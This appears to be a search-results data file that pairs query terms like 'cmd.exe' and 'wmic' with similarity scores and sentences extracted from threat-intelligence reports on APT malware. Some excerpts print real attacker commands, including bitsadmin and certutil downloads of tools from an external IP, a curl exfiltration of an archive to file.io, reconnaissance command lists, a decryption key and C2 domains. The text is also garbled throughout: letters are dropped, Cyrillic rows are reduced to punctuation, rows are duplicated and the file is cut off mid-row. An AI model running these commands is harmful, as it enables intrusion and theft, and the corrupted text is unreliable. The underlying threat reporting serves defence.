ff6f1d18e04fd114b36c7b03e99afca4,yielding a PE file that is loaded and run in memory with .NET.,0.8467561942284374,"[""Thre files are sent to the victim's computer: GDFInstal.exe (MD5: 13435101240f78367123ef01a938c560) is a legitimate computer game component signed by Ubisoft."", 'GameuxInstalHelper.dl (MD5: 1fd840275d42e7389f0d28b9537db0f) is a .NET DL library (compiled on April 29, 2020) imported when GDFInstal.exe is run.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 8/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction This component is not actualy legitimate, however: atacker code is executed after the GameExplorerInstalW symbol is exported.', 'This frequently used technique of loading malicious code in the context of a legitimate aplication is known as DL hijacking.', 'htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 9/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction The file c:\\programdata\\Sysurl.Hex is read (after being copied from c:\\windows\\system32\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFSDJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.', 'Deletion ocurs in the standard (insecure) way, which enables recovering the data if disk aces is stoped in time and the information has not ben overwriten.', 'Sysurl.Hex is an encrypted copy of the Polar ransomware.', 'This payload cal sequence (in which a legitimate aplication loads a malicious library, which in turn decrypts a third component and pases control to it) is very comonly used to run the PlugX backdor, which is widely sen among such Asian APT groups as APT10, APT41, htps:/w.ptsecurity.com/w-en/analytics/pt-esc-threat-inteligence/incident-response-polar-ransomware-apt27/ 10/23 1/30/2020 Investigation with a twist: an acidental APT atack and averted data destruction TA459, and Bronze Union.', ""Let's consider the decrypted and decoded version of the ransomware (MD5: 841980b4ae02a4e6520ab834de241b) in greater detail.""]"
d5019121cbc645eb0787efab173a12b3,wmic,0.7832871736269563,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
949b57ffdfcc42e1765f65e65995733b,wmic,0.862634642643921,[]
949b57ffdfcc42e1765f65e65995733b,wmic,0.8873197545818806,"['This module executes a series of comands to gather aditional host information, which is subsequently uploaded to a C2 server.', 'Interestingly, the comands are not identical to the analogous module examined in the initial Symantec report.', 'These comands executed by this module are almost al wmic comands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snipet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypas configuration arays with an iterator (v2).', 'Shamon 1, 2 and 3 and Kwampirs, al contain arays for C2, and Proxy, ProxyByPas, and acesType information.', 'INDEX cylera.com 24 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAdres, EndingAdres wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snipet 9: Kwampirs comands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it sems likely that the use of this module is intended for a reconaisance phase.', 'The types of information gathered may imply that the physical atributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be infered from this information.', 'INDEX cylera.com 25 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon 5.1.5 Artifact Similarities File Metadata The metadata of the droper and reporter components (DL and EXE) are based on metadata taken from legitimate Microsoft files in both Kwampirs and Shamon (Figures 30, 31, 32 and 3), but in the case of Kwampirs, metadata from other files/companies was also used in later campaigns.', 'Kwampirs Droper Shamon Droper Figure 30: Kwampirs droper metadata Figure 31: Shamon droper metadata INDEX cylera.com 26 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon Kwampirs Reporter Shamon Reporter Figure 32: Kwampirs reporter metadata Figure 3: Kwampirs reporter metadata It is worth noting that the metadata of later Kwampirs samples loks diferent and contains many diferent tols.']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
920bbf3f4cf30cf9c556531074485448,"""cmd.exe",0.8176210416244082,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
31347d89b18461f35448b26fefb00133,"""cmd.exe",1.0,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
399c17d5f44d8b855c9751aae73f3c11,"""cmd.exe",0.8937965527573956,"['These files provide sequential execution of comands using algorithmic structures such as conditional operators and lops.', 'Seing as how cmd.exe is employed by atackers in a large number of cases and overlaps with other techniques of the MITRE AT&CK matrix, here we wil examine only a few examples of cmd.exe use at diferent stages of an atack without delving to dep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.', 'Here are al the reconaisance comands employed in the script: ver > :\\Windows\\Web\\systeminfo.txtb time /t > :\\Windows\\Web\\systeminfo.txtb date /t > :\\Windows\\Web\\systeminfo.txtb hostname > :\\Windows\\Web\\systeminfo.txtb systeminfo > :\\Windows\\Web\\systeminfo.txtb net localgroup Administrators > :\\Windows\\Web\\systeminfo.txtb ipconfig /al > :\\Windows\\Web\\systeminfo.txtb tasklist /v > :\\Windows\\Web\\systeminfo.txtb tasklist -svc > :\\Windows\\Web\\systeminfo.txtb net start > :\\Windows\\Web\\systeminfo.txtb ping w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb tracert -h 5 w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb netstat -aon > :\\Windows\\Web\\systeminfo.txtb netstat -bv > :\\Windows\\Web\\systeminfo.txtb net use > :\\Windows\\Web\\systeminfo.txtb net share > :\\Windows\\Web\\systeminfo.txtb net view > :\\Windows\\Web\\systeminfo.txtb net view /domain > :\\Windows\\Web\\systeminfo.txtb net group /domain > :\\Windows\\Web\\systeminfo.txtb net user > :\\Windows\\Web\\systeminfo.txtb net user /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain controlers"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain admins"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain computers"" /domain > :\\Windows\\Web\\systeminfo.txtb nltest /domain_trusts > :\\Windows\\Web\\systeminfo.txtb route print > :\\Windows\\Web\\systeminfo.txtb arp -a > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\program files\\*.', '*"" > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\Program Files (x86)\\*.']"
cd55962babfd80de741da3cfcd92ebe3,"""cmd.exe",0.82672272449881,"['It is worth noting that these samples were al compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Aditionaly, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed sugesting this is al part of the same campaign.', 'Despite this potential conection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware atempts to run a series of comands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These comands are as folows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Internet Setings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is sen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTP/1.1 Conection: Kep-Alive User-Agent: Mozila/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/2010101 Firefox/47.0 Host: w.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4c10ab3f4e6769e520694a10f61d5) does not use eye-watch[.', ']in as a C&C chanel but instead was downloaded from the URL: hxps:/w.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
4cfa49159667f23c95faae1778231c91,"""cmd.exe",0.845503132152836,"['Modular architecture of the victims infection proces provides both aditional flexibility and anonymity throughout the cyber-atack.', 'This scheme alows hackers to divide software development activity betwen teams, as wel as to ensure the reuse of program code.', 'Recon Performs initial reconaisance to determine if a systems is of interest to the threat actors Droper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TraficForwarder and injects into the legitimate proces Client_TraficForwarder Forwards operators comands from external network into corporate network Client_RAT Provides ful control over the target system Recon is a backdor that is initialy instaled on the target machine through sucesful execution of exploits.', 'This module is used by hackers to perform initial reconaisance to search for systems of interest.', 'Once launched, the program ads itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\ApData\\Roaming\\Microsoft\\Windows\\ Start Menu\\Programs\\Startup"", colects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data colected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\ CurentVersion\\Internet Setings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tols, atribution 1 Key 2 Atack 3 Atack 4 Recomendations 5 Indicators of 6 Apendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module wil use the ""kilkil"" comand to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Droper using the htp comand.', 'Droper wil then instal Client_RAT to the infected system as folows: RECON DROPER LOADER CLIENT_RAT 1 2 3 DROPER Recon decrypts LOADER Droper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Droper extracts decrypted Client_RAT Client_RAT Droper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Droper neds MD5 encryption key, which only the atacker knows.', 'Group-IB specialists have analyzed two versions of Droper.', 'There are no fundamental diferences betwen them: both versions were used to decrypt the loader and encrypted payload, as wel as to ensure loader persistence in the system.']"
d5019121cbc645eb0787efab173a12b3,"""cmd.exe",0.8135172745614935,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,"""cmd.exe",0.7962584600454754,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
af9a848f4c926a7dce431e4a9399b939,"""cmd.exe",0.7597704693771454,"['NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tol at its disposal, caled Symbexcel, that aplies symbolic execution techniques to the analysis of Excel macros.16 Using this tol, we can automaticaly de-obfuscate the XL4 macros and identify the aditional components being downloaded (se Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threfold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The atackers may chose to use multiple hosts to increase the chances to download the payload and improve suces rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by runing rundl32.exe.', '3.', 'Gain registry persistence by runing DlRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC comand line is shown Figure 6).', 'The payload is a DL file, which (unsurprisingly) is the main Emotet DL.', 'In the case of the Excel document with hash 7c0d0a80e7eb3af7ce549df78a5a68cbd5deb5, the DL is 8cf39a587aeb8f075a0ae23a42e16ce3656e71.']"
6676698d65e372feb79c0159d9d2b11e,"""cmd.exe",1.0,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
cae33c8970a53857dff6608fe8894b8a,Scheduled Task/Job: Scheduled Task,0.934183037653227,"['Copyright Leonardo S.p.a. Al rights reserved 2 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE AT&CK TPs T1059 Comand-Line Comand-line interfaces provide a way of interacting with computer Interface systems and is a comon feature acros many types of operating system platforms.', 'One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often acomplished by the host based firewal, but could also be implemented by custom software.', 'T105 Remote File Files may be copied from one system to another to stage adversary Copy tols or other files over the course of an operation.']"
0797d04ce55799cf7c3246d39567ce99,Scheduled Task/Job: Scheduled Task,0.7989009310825919,"['Analyze The recipients of the document 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf 8.t are (at the end of the document): the deputy minister; - the units under the ministry; - police of provinces and cities directly under the central government; - Department of Inspection of Legal Documents of the Ministry of Justice; - Oficial Journal, Government Electronic Portal, Ministry of Public Security Portal; - Archive: VT, C06 (P1).', 'The document exploits Equation Editor starts aplication (CVE-2017182) to decode the 8.t in memory, after fork to instal two files: C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f and C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da The malware is a dl, it sems to be Gh0st RAT.', 'htps:/ap.any.run/tasks/5715cfe3-250-4808-ad0-1ea4c4fc7a8 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe cal in the entry loads dynamicaly wsc.dl and cal the function _run@4 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 1/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to conect to nicetis54.lflink.com|185.216.35.1.', 'htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 2/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Inteligence Consideration We have the same Tps and victimology like Goblin Panda: Oficials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdor has changed.', 'Its used a scheduled task.', 'Usualy this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha256 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha1 6e670a837970a1fb4161d7d5f720d318d7e4dbc md5 f3451418eb4689560cd6c0c654f26d9 Droped executable file sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 3/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetis54.lflink.com Conections ip 185.216.35.1 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 4/4']"
0797d04ce55799cf7c3246d39567ce99,Scheduled Task/Job: Scheduled Task,0.7989009310825919,"['Analyze The recipients of the document 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf 8.t are (at the end of the document): the deputy minister; - the units under the ministry; - police of provinces and cities directly under the central government; - Department of Inspection of Legal Documents of the Ministry of Justice; - Oficial Journal, Government Electronic Portal, Ministry of Public Security Portal; - Archive: VT, C06 (P1).', 'The document exploits Equation Editor starts aplication (CVE-2017182) to decode the 8.t in memory, after fork to instal two files: C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f and C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da The malware is a dl, it sems to be Gh0st RAT.', 'htps:/ap.any.run/tasks/5715cfe3-250-4808-ad0-1ea4c4fc7a8 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe cal in the entry loads dynamicaly wsc.dl and cal the function _run@4 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 1/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to conect to nicetis54.lflink.com|185.216.35.1.', 'htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 2/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Inteligence Consideration We have the same Tps and victimology like Goblin Panda: Oficials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdor has changed.', 'Its used a scheduled task.', 'Usualy this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha256 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha1 6e670a837970a1fb4161d7d5f720d318d7e4dbc md5 f3451418eb4689560cd6c0c654f26d9 Droped executable file sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 3/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetis54.lflink.com Conections ip 185.216.35.1 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 4/4']"
b5d067b705e3d7716dc5cd360e61cc7d,Scheduled Task/Job: Scheduled Task,0.8120433480426443,"['The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.', 'The decrypted strings are as folows: 1.', 'The MagicString clas provides a geter property, which decrypts strings on aces.', '2.', 'The MagicString clas has an encrypted string field.', '3.', 'The MagicString clas provides _Decrypt, a wraper method for decryption.', '4.', 'If it is StealthMutants first time to use the _Decrypt method, the AES (Advanced Encryption Standard) key and initialization vector (IV) wil be initialized based on the hard-coded _factory value, although this IV is meaningles in Electronic Code Block (ECB) mode.', 'The key is the SHA-256 hash, while the IV is the MD5 hash.', 'The values of the SHA-256 and MD5 hashes vary with each StealthMutant sample.']"
751a00c60e4d6cfbca29fd60f12530fc,Scheduled Task/Job: Scheduled Task,0.8097446295814936,"['Tactic ID Name Description Initial ScarCruft uses watering-hole atacks to T189 Drive-by Compromise Aces compromise victims.', 'Execution Comand and Scripting Interpreter: T1059.06 The Dolphin loader a uses Python script.', 'Python 7/8 Tactic ID Name Description Comand and Scripting Interpreter: ScarCruft used malicious JavaScript for a T1059.07 JavaScript watering-hole atack.', 'ScarCruft exploits CVE-2020-1380 to T1203 Exploitation for Client Execution compromise victims.', 'Dolphin uses Windows API functions to execute T106 Native API files and inject proceses.', 'Scheduled Task/Job: Scheduled Dolphin uses a temporary scheduled task to T1053.05 Task start after instalation.', 'Persistence Bot or Logon Autostart Execution: Dolphin uses Run keys for persistence of its T1547.01 Registry Run Keys / Startup Folder loader.', 'Proces Injection: Portable Defense T105.02 Dolphin can inject into other proceses.', 'Executable Injection Evasion T1027 Obfuscated Files or Information Dolphin has encrypted components.', 'Credentials from Pasword Stores: Dolphin can obtain saved paswords from Credential T15.03 Credentials from Web Browsers browsers.', 'Aces T1539 Steal Web Sesion Cokie Dolphin can obtain cokies from browsers.']"
decab25100660c0deaa8f97d0f3bf308,Scheduled Task/Job: Scheduled Task,0.779149935828726,"['Figure 7.', 'Intrusion flow sequence diagram An overview of whats shown in the sequence diagram above is the folowing: 1.', 'On launch, the primary NoxPlayer executable Nox.exe wil send a request via the API to query update information.', '2.', 'The BigNox API server responds to the client request with specific update information, including the URL to download the update from BigNox legitimate infrastructure.', '3.', 'Nox.exe provides the apropriate parameters to NoxPlayer.exe to download the update.', '4.', 'The legitimate update stored in BigNox infrastructure could have ben replaced with malware, or it may be a new filename/URL not used by legitimate updates.', '5.', 'Malware is instaled on the victims machine.']"
decab25100660c0deaa8f97d0f3bf308,Scheduled Task/Job: Scheduled Task,0.7878142535667818,"['Figure 7.', 'Intrusion flow sequence diagram An overview of whats shown in the sequence diagram above is the folowing: 1.', 'On launch, the primary NoxPlayer executable Nox.exe wil send a request via the API to query update information.', '2.', 'The BigNox API server responds to the client request with specific update information, including the URL to download the update from BigNox legitimate infrastructure.', '3.', 'Nox.exe provides the apropriate parameters to NoxPlayer.exe to download the update.', '4.', 'The legitimate update stored in BigNox infrastructure could have ben replaced with malware, or it may be a new filename/URL not used by legitimate updates.', '5.', 'Malware is instaled on the victims machine.']"
b1f24bc0a710da94a01ed1c918558714,Scheduled Task/Job: Scheduled Task,0.7521318764431026,"['IoCs Files SHA-1 ESET detection name Description 5C7A180CF58DF9FBA102D8267C3F369DF49 Win32/TrojanDroper.Agent.SJQ Trojanized instaler ( gca01-client-v2-x64-8.3.msi ) B0E4E9B6EF8A7A9FCB9C9E571D8162B1B243A Win32/TrojanDroper.Agent.SJQ Trojanized instaler ( gca01-client-v2-x32-8.3.msi ) 952F369AC109B03E6C1651D49D1C5B42E12A4 Win32/TrojanDroper.Agent.SJQ PhantomNet droper 98934094EC5BA8E0E8F238CDF34D5C57C283F2 Win32/PhantomNet.B PhantomNet 5DFC07B6034B4FDA217D9641FB86F5D43B6C62 Win32/PhantomNet.A PhantomNet plugin C&C servers ofice365.blogdns[.', ']com vgca.homeunix[.', ']org MITRE AT&CK Note: This table was built using version 8 of the MITRE AT&CK framework.', 'Tactic ID Name Description Initial Aces T195.02 Suply Chain Compromise: Compromise Software Atackers modified the instaler of the GCA01 software that is hosted on ca.gov.vn and aded a backdor Suply Chain to the MSI instaler.', 'Execution T1204.02 User Execution: Malicious File The victim neds to manualy execute the trojanized instaler.', 'Persistence T1053.05 Scheduled Task/Job: Scheduled Task If the user doesnt have admin privileges, PhantomNet persists via a scheduled task.', 'T1543.03 Create or Modify System Proces: Windows Service If the user has admin privileges, PhantomNet persists via a Windows service.', 'Discovery T103 System Owner/User Discovery PhantomNet implements a function to retrieve the username.', 'T1082 System Information Discovery PhantomNet implements a function to retrieve the OS version.', 'Comand and T1090.01 Proxy: Internal Proxy PhantomNet can retrieve the proxy configuration of the default browser and use it to conect to the C&C Control server.', 'htps:/w.welivesecurity.com/2020/12/17/operation-signsight-suply-chain-atack-southeast-asia/ 5/6 12/18/2020 Operation SignSight: Suply-chain atack against a certification authority in Southeast Asia | WeLiveSecurity Tactic ID Name Description T1071.01 Aplication Layer Protocol: Web Protocols PhantomNet uses HTPS.']"
b1f24bc0a710da94a01ed1c918558714,Scheduled Task/Job: Scheduled Task,0.7521318764431026,"['IoCs Files SHA-1 ESET detection name Description 5C7A180CF58DF9FBA102D8267C3F369DF49 Win32/TrojanDroper.Agent.SJQ Trojanized instaler ( gca01-client-v2-x64-8.3.msi ) B0E4E9B6EF8A7A9FCB9C9E571D8162B1B243A Win32/TrojanDroper.Agent.SJQ Trojanized instaler ( gca01-client-v2-x32-8.3.msi ) 952F369AC109B03E6C1651D49D1C5B42E12A4 Win32/TrojanDroper.Agent.SJQ PhantomNet droper 98934094EC5BA8E0E8F238CDF34D5C57C283F2 Win32/PhantomNet.B PhantomNet 5DFC07B6034B4FDA217D9641FB86F5D43B6C62 Win32/PhantomNet.A PhantomNet plugin C&C servers ofice365.blogdns[.', ']com vgca.homeunix[.', ']org MITRE AT&CK Note: This table was built using version 8 of the MITRE AT&CK framework.', 'Tactic ID Name Description Initial Aces T195.02 Suply Chain Compromise: Compromise Software Atackers modified the instaler of the GCA01 software that is hosted on ca.gov.vn and aded a backdor Suply Chain to the MSI instaler.', 'Execution T1204.02 User Execution: Malicious File The victim neds to manualy execute the trojanized instaler.', 'Persistence T1053.05 